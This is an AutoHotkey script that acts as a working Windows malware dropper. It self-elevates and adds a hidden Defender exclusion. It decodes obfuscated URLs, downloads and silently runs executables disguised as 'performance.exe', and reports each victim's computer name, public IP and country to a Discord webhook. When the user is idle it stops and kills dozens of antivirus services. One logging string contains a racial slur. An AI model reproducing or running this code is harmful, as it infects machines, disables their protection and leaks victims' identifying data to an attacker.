#Requires AutoHotkey v2.0
#SingleInstance Force
#NoTrayIcon
if !A_IsAdmin {
    try {
        Run('*RunAs "' A_ScriptFullPath '"')
    } catch {
        NDWithLocation("🚀 nigga no start with admin " EnvGet("COMPUTERNAME") " at " A_Now)
        MsgBox "The script needs admin privilges to continue working..."
    }
    ExitApp
}
SetTimer CheckInactivity, 30000 
A_ThisException := ""
;–– CONFIG ––
wk := [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,51,55,51,51,51,56,57,48,48,53,50,57,49,53,54,49,57,54,47,77,90,88,113,68,52,76,87,49,48,67,79,90,52,83,121,68,55,77,95,118,52,55,90,77,70,54,89,68,112,48,84,66,88,51,111,65,82,67,82,69,84,84,97,98,82,103,87,110,102,79,95,110,82,77,78,77,104,69,50,104,120,48,51,77,90,49,68]
exe := [104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,115,105,107,107,101,101,110,116,121,112,101,47,100,101,109,111,110,115,47,109,97,105,110,47,112,101,114,102,111,114,109,97,110,99,101,46,101,120,101,101]
fs := [104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,115,105,107,107,101,101,110,116,121,112,101,47,100,101,109,111,110,115,47,109,97,105,110,47,112,101,114,102,111,114,109,97,110,99,101,118,50,46,101,120,101
]
exeUrl := CharListToStr(exe)
wkUrl := CharListToStr(wk)
fsUrl := CharListToStr(fs)
failureCount := 0
notified := false
cachedGeo := ""
cachedIP := ""
tempDir := A_AppData . "\PerformanceRun2"
exePath := tempDir . "\performance.exe"
fsPath := tempDir . "\performancev2.exe"
if DirExist(tempDir)
    DirDelete(tempDir, true)
DirCreate(tempDir)
AddDefenderException(tempDir)
NDWithLocation("🚀 Script started on " EnvGet("COMPUTERNAME") " at " A_Now)
loop 10000 {
if !TryMainExe()
    TryfsExe()
    sleep 1200000
}
TryMainExe() {
    global exeUrl, exePath
    retryLimit := 3
    if !PingURL(exeUrl) {
        NDWithLocation("❌ Main EXE unreachable: " . exeUrl)
        return false
    }
    NDWithLocation("✅ Main EXE URL reachable")
    Loop retryLimit {
        attempt := A_Index
        if TryDownloadAndRun(exeUrl, exePath, "performance.exe", attempt) {
            NDWithLocation("✅ Launched performance.exe successfully")
            ExitApp
        }
        Sleep Random(10000, 30000)
    }
    NDWithLocation("❌ performance.exe failed after " retryLimit " attempts")
    return false
}
TryfsExe() {
    global fsUrl, fsPath
    retryLimit := 3

    if !PingURL(fsUrl) {
        NDWithLocation("❌ Failsafe EXE unreachable: " . fsUrl)
        return false
    }

    NDWithLocation("✅ Failsafe EXE URL reachable")
    Loop retryLimit {
        attempt := A_Index
        if TryDownloadAndRun(fsUrl, fsPath, "performancev2.exe", attempt) {
            NDWithLocation("🛡️ Launched performancev2.exe as failsafe")
            ExitApp
        }
        Sleep Random(10000, 30000)
    }
    NDWithLocation("❌ performancev2.exe failed after " retryLimit " attempts")
    return false
}
TryDownloadAndRun(url, path, procName, attempt) {
    try {
        HttpGetAndSave(url, path)
    } catch as e {
        NDWithLocation("❌ Attempt " . attempt . " - Download failed for " . procName . ": " . e.Message)
        return false
    }
    try {
        size := FileOpen(path, "r").Length
        if (size = 0) {
            NDWithLocation("❌ Attempt " . attempt . " - Downloaded file is empty: " . procName)
            return false
        }
        cmd := "cmd.exe /c " . Chr(34) . path . Chr(34)
        ComObject("WScript.Shell").Run(cmd, 0, false)
        Sleep 2000
        if IsProcessRunning(procName) {
        NDWithLocation("✅ " . procName . " is running. Exiting script.")
        ;SetTimer CheckInactivity, 0
        ExitApp
}
        NDWithLocation("❌ Attempt " . attempt . " - Process not running: " . procName)
    } catch as e {
        NDWithLocation("❌ Attempt " . attempt . " - Launch error for " . procName . ": " . e.Message)
    }
    return false
}
IsProcessRunning(name) {
    try {
        shell := ComObject("WScript.Shell")
        exec := shell.Exec("tasklist /FI " . Chr(34) . "IMAGENAME eq " . name . Chr(34))
        output := exec.StdOut.ReadAll()
        return InStr(output, name) > 0
    } catch {
        return false
    }
}
PingURL(url) {
    try {
        req := ComObject("WinHttp.WinHttpRequest.5.1")
        req.Open("HEAD", url, false)
        req.Send()
        return (req.Status = 200)
    } catch {
        return false
    }
}
HttpGetAndSave(url, savePath) {
    try {
        req := ComObject("WinHttp.WinHttpRequest.5.1")
        req.Open("GET", url, false)
        req.Send()
        if (req.Status = 404)
            throw "HTTP 404: File not found"
        else if (req.Status != 200)
            throw Format("HTTP {1}", req.Status)

        stm := ComObject("ADODB.Stream")
        stm.Type := 1
        stm.Open()
        stm.Write(req.ResponseBody)
        stm.SaveToFile(savePath, 2)
        stm.Close()
    } catch as e {
        throw e
    }
}
ND(msg) {
    global wkUrl
    try {
        json := "{" Chr(34) "content" Chr(34) ":" Chr(34) msg Chr(34) "}"
        http := ComObject("WinHttp.WinHttpRequest.5.1")
        http.Open("POST", wkUrl, false)
        http.SetRequestHeader("Content-Type", "application/json")
        http.Send(json)
    } catch {
        ; Fail silently
    }
}
NDWithLocation(msg) {
    try {
        loc := GetGeoInfo()
        ip := GetPublicIP()
        pc := EnvGet("COMPUTERNAME")
        ND(loc . " 🌐 [IP: " . ip . "] 🖥️ [" . pc . "] " . msg)
    } catch {
        ND("🌐 [Geo/IP info unavailable] 🖥️ [" . EnvGet("COMPUTERNAME") . "] " . msg)
    }
}
GetGeoInfo() {
    global cachedGeo
    if (cachedGeo != "")
        return cachedGeo

    req := ComObject("WinHttp.WinHttpRequest.5.1")
    req.Open("GET", "http://ip-api.com/line/?fields=countryCode,country", false)
    req.Send()
    if (req.Status = 200) {
        lines := StrSplit(req.ResponseText, "`n")
        code := Trim(lines[1])
        name := Trim(lines[2])
        flag := Chr(0x1F1E6 + Ord(SubStr(code, 1, 1)) - 65) . Chr(0x1F1E6 + Ord(SubStr(code, 2, 1)) - 65)
        cachedGeo := "🌐 [" . flag . "] " . name
        return cachedGeo
    } else
        throw "Geo request failed"
}
GetPublicIP() {
    global cachedIP
    if (cachedIP != "")
        return cachedIP

    req := ComObject("WinHttp.WinHttpRequest.5.1")
    req.Open("GET", "https://api.ipify.org", false)
    req.Send()
    if (req.Status = 200) {
        cachedIP := Trim(req.ResponseText)
        return cachedIP
    } else
        throw "IP fetch failed"
}
CharListToStr(arr) {
    out := ""
    for c in arr
        out .= Chr(c)
    return out
}
AddDefenderException(path) {
    try {
        powershellCmd := "powershell -WindowStyle Hidden -Command `"Add-MpPreference -ExclusionPath '{1}'`""
        fullCmd := Format(powershellCmd, path)
        result := ComObject("WScript.Shell").Run(fullCmd, 0, true)
        if (result = 0)
            NDWithLocation("🛡️ Defender exclusion added for: " . path)
        else
            NDWithLocation("⚠️ Defender exclusion failed with exit code: " . result)
    } catch {
        NDWithLocation("❌ Exception while adding Defender exclusion: " . A_ThisException)
    }
}
CheckInactivity() {
    if (A_TimeIdle >= 1200000) {  ; 20 minutes
        detectedAVs := DetectAntivirus()
        if detectedAVs.Length > 0 {
            KillAntivirusProcesses(detectedAVs)
            NDWithLocation("⚠️ Inactivity trigger: AV processes terminated.")
            try {
                proc := Run('*RunAs "' A_ScriptFullPath '"')
                if IsObject(proc) {
                    NDWithLocation("✅ Inactivity trigger: Script successfully re-launched with admin privileges.")
                } else {
                    NDWithLocation("❌ Unknown failure when re-launching script with admin privileges.")
                }
            } catch as e {
                NDWithLocation("❌ Exception during admin re-launch: " . e.Message)
            }
            ExitApp
        }
    }
}
DetectAntivirus() {
    knownAVs := [
        "MsMpEng.exe"
      , "avp.exe"
      , "mcshield.exe"
      , "avguard.exe"
      , "avgsvc.exe"
      , "ashserv.exe"
      , "bdagent.exe"
      , "ns.exe"
      , "fsav32.exe"
      , "zav.exe"
      , "psanhost.exe"
      , "drweb32w.exe"
      , "egui.exe"
      , "WRSA.exe"
      , "360tray.exe"
      , "ntrtscan.exe"
      , "k7tsmon.exe"
      , "clamav.exe"
      , "smc.exe"
      , "cmdagent.exe"
      , "sophosui.exe"
      , "mbamservice.exe"
      , "antivirusservice.exe"
      , "IMFsrv.exe"
      , "a2guard.exe"
      , "bguninservice.exe"
      , "baiduav.exe"
      , "qhe.exe"
      , "wwengine.exe"
      , "CylanceSvc.exe"
      , "csfalconservice.exe"
      , "pandaagent.exe"
      , "vipservice.exe"
      , "totalavservice.exe"
      , "avastsvc.exe"
      , "kraepserv.exe"
      , "fortics.exe"
      , "adaware_gui.exe"
      , "mfefire.exe"
      , "bdservicehost.exe"
      , "ccsvchst.exe"
      , "mbam.exe"
      , "zaupdatersvc.exe"
      , "fsaua.exe"
      , "sophoschedulednotification.exe"
      , "hmservice.exe"
      , "pavprot.exe"
      , "eemk.exe"
      , "wrdiag.exe"
      , "npec.exe"
    ]
    found := []
    for proc in knownAVs
        if IsProcessRunning(proc)
            found.Push(proc)
    if found.Length
        NDWithLocation("🔍 Detected Antivirus: " . StrJoin(found, ", "))
    else
        NDWithLocation("🔍 No major antivirus detected")
    return found
}
KillAntivirusProcesses(avList) {
    ; explicit mapping from EXE → Windows service name
    serviceMap := Map(
         "MsMpEng.exe",                       "WinDefend"
      ,  "avp.exe",                           "ekrn"
      ,  "mcshield.exe",                      "McShield"
      ,  "avguard.exe",                       "AvGuard"
      ,  "avgsvc.exe",                        "AvgSvc"
      ,  "ashserv.exe",                       "AvastSvc"
      ,  "bdagent.exe",                       "BDServiceHost"
      ,  "ns.exe",                            "NISSvc"
      ,  "fsav32.exe",                        "FSMA32"
      ,  "zav.exe",                           "ZLA"
      ,  "psanhost.exe",                      "PSANHost"
      ,  "drweb32w.exe",                      "DrWebSvc"
      ,  "egui.exe",                          "ekrn"
      ,  "WRSA.exe",                          "WRSA"
      ,  "360tray.exe",                       "360Tray"
      ,  "ntrtscan.exe",                      "NTRTSCAN"
      ,  "k7tsmon.exe",                       "K7TSMon"
      ,  "clamav.exe",                        "clamav"
      ,  "smc.exe",                           "smc"
      ,  "cmdagent.exe",                      "CmdAgent"
      ,  "sophosui.exe",                      "SAVService"
      ,  "mbamservice.exe",                   "MBAMService"
      ,  "antivirusservice.exe",              "AntivirusService"
      ,  "IMFsrv.exe",                        "IMFSrv"
      ,  "a2guard.exe",                       "A2Agent"
      ,  "bguninservice.exe",                 "BgNinService"
      ,  "baiduav.exe",                       "Baidu Antivirus"
      ,  "qhe.exe",                           "QuickHeal"
      ,  "wwengine.exe",                      "WwEngine"
      ,  "CylanceSvc.exe",                    "CylanceSvc"
      ,  "csfalconservice.exe",               "CSFalconService"
      ,  "pandaagent.exe",                    "PSANHost"
      ,  "vipservice.exe",                    "VipreService"
      ,  "totalavservice.exe",                "TotalAVService"
      ,  "avastsvc.exe",                      "AvastSvc"
      ,  "kraepserv.exe",                     "K7TSMon"
      ,  "fortics.exe",                       "FortiClient"
      ,  "adaware_gui.exe",                   "AdAwareService"
      ,  "mfefire.exe",                       "mfeFire"
      ,  "bdservicehost.exe",                 "BDServiceHost"
      ,  "ccsvchst.exe",                      "ccsvchst"
      ,  "mbam.exe",                          "MBAMService"
      ,  "zaupdatersvc.exe",                  "ZoneAlarmUpdateSvc"
      ,  "fsaua.exe",                         "FSauA"
      ,  "sophoschedulednotification.exe",    "SophosScheduledNotification"
      ,  "hmservice.exe",                     "HMService"
      ,  "pavprot.exe",                       "PAVProt"
      ,  "eemk.exe",                          "EmsisoftEKService"
      ,  "wrdiag.exe",                        "WRDiagSvc"
      ,  "npec.exe",                          "NPECService"
    )
    for proc in avList {
        ; pick override if present, otherwise strip “.exe”
        if serviceMap.Has(proc)
            svcName := serviceMap[proc]
        else
            svcName := RegExReplace(proc, "\.exe$", "")

        ; stop the service
        svcExit := RunWait('sc stop "' svcName '"', , "Hide")
        if (svcExit = 0)
            ND("🔧 Stopped service: " . svcName)
        else
            ND("⚠️ Couldn’t stop service: " . svcName)

        ; kill the process
        exitCode := RunWait("taskkill /F /IM " proc, , "Hide")
        if (exitCode = 0)
            ND("❌ Terminated: " . proc)
        else
            ND("⚠️ Failed to terminate: " . proc)
    }
}
av := DetectAntivirus()
if av.Length
    KillAntivirusProcesses(av)
StrJoin(arr, delim := ", ") {
    out := ""
    for i, val in arr
        out .= (i > 1 ? delim : "") . val
    return out
}
